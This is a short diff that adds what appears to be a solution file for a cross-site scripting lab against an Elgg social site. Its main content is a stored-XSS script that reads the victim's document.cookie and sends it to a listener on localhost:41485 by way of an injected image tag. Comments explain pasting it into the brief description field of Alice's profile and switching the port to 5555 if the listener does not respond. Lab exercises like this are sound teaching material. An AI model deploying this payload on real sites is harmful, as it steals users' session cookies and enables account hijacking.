@@ -1,0 +1,7 @@
+<script>var url = document.cookie; var img = document.createElement("img"); img.src = "http://localhost:41485/"+url; var src = document.getElementsByClassName("elgg-page elgg-page-default")[0]; src.appendChild(img); </script>
+
+<! -- NOTE!!!! -->
+
+<! -- Paste the above into the brief description field of Alice's profile. For some reason, echoserv.py -->
+<! -- was listening to port 5555 instead of port 41485 so the above line doesn't actually print anything -->
+<! -- for me. Hopefully it will for you. If it doesn't, change the port to 5555 maybe? -->
